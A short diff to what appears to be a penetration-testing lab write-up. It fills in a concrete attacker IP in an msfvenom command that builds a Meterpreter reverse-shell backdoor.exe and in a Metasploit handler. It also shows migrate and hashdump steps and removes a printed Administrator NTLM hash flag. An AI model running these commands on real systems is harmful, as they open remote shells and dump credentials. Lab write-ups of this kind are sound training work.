@@ -67,7 +67,7 @@ From the Kali attacker:
 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp \
-  LHOST=<attacker_ip> LPORT=4444 \
+  LHOST=10.4.18.215 LPORT=4444 \
   -f exe > backdoor.exe
 ```
 
@@ -76,7 +76,7 @@ msfvenom -p windows/meterpreter/reverse_tcp \
 ```bash
 use exploit/multi/handler
 set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST <attacker_ip>
+set LHOST 10.4.18.215
 set LPORT 4444
 exploit -j
 ```
@@ -110,11 +110,7 @@ migrate <PID>
 hashdump
 ```
 
-Administrator NTLM hash (flag):
-
-```
-4d6583ed4cef81c2f2ac3c88fc5f3da6
-```
+Administrator NTLM hash recovered from LSASS memory.
 
 ---
 
